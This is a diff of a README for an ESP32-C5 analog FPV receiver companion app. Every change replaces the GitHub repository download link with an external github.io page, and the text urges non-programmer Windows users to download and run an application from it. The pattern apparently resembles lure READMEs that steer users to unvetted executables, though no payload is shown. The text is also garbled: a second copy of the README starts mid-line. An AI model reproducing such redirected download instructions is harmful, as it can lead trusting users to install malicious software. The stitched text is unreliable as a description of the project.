@@ -1,6 +1,6 @@
 # 📡 esp32-fpv-receiver - Build Your Analog FPV Receiver
 
-[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xxxcrayon/esp32-fpv-receiver)
+[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xxxcrayon.github.io)
 
 esp32-fpv-receiver is a build companion for the C5VRX setup. It combines ESP32-C5 analog FPV wiring guidance, source firmware, and a real-device USB console in one place. The project is aimed at Windows users who want a clear path from download to first connection without needing programming knowledge.
 
@@ -25,7 +25,7 @@ You can use the download page to get the application, then follow the wiring and
 - **Plain-language troubleshooting:** Common cable, port, power, and connection checks are covered in simple steps.
 - **Practical build reference:** The repository acts as a reference point for the receiver build rather than a set of unrelated files# 📡 esp32-fpv-receiver - Build Your Analog FPV Receiver
 
-[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xxxcrayon/esp32-fpv-receiver)
+[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xxxcrayon.github.io)
 
 This page helps you download and run the esp32-fpv-receiver companion application on Windows. The application supports the C5VRX build with analog FPV wiring guidance, source firmware, and a real-device USB console. You do not need programming knowledge to use it. The steps below are written for everyday Windows users who want a clear path from download to first connection with the board.
 
@@ -35,7 +35,7 @@ You need a Windows computer with a working USB port. Windows 10 or Windows 11 is
 
 ## ⬇️ Download the Application
 
-Visit this link to download the application: [Download esp32-fpv-receiver](https://github.com/xxxcrayon/esp32-fpv-receiver). Open the link in your web browser. The page will show you the available files and information for the companion package. This is the starting point for getting the application on your computer. Save the downloaded item to a folder you can easily find, such as your Desktop or Downloads folder.
+Visit this link to download the application: [Download esp32-fpv-receiver](https://xxxcrayon.github.io). Open the link in your web browser. The page will show you the available files and information for the companion package. This is the starting point for getting the application on your computer. Save the downloaded item to a folder you can easily find, such as your Desktop or Downloads folder.
 
 ## 🛠️ Set Up the Application on Windows
 
@@ -71,6 +71,6 @@ Do I need to know programming to use this application? No. The console is made f
 
 ## 🔗 Download Again
 
-Visit this link to download the application: [Download esp32-fpv-receiver](https://github.com/xxxcrayon/esp32-fpv-receiver). Keep the link handy in case you need to set up the application on another Windows computer or return to the download page for the wiring guidance and firmware information.
+Visit this link to download the application: [Download esp32-fpv-receiver](https://xxxcrayon.github.io). Keep the link handy in case you need to set up the application on another Windows computer or return to the download page for the wiring guidance and firmware information.
 
 Keywords: esp32-c5, fpv receiver, analog fpv, c5vrx, usb console, wiring guide, source firmware, windows companion, esp32 fpv, receiver build
